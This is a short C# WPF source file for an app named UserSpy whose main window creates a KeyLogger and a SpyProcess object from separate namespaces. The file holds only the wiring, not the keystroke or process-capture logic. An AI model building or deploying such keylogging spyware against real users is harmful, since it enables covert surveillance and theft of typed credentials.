using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using keylogger;
using keylogger.keylog;
using spyprocess;
using spyprocess.processlog;
using spyprocess.processmodel;
using userspyprocess;
using System.IO;
using System.Diagnostics;

namespace UserSpy
{    
    public partial class MainWindow : Window
    {
        KeyLogger logger;
        SpyProcess SP;
        
        public MainWindow()
        {
            logger = new KeyLogger();
            SP = new SpyProcess();
            InitializeComponent();
            MessageBox.Show($"{UserSpyProcess.GetFullPath()}");
            
        }
    }
}
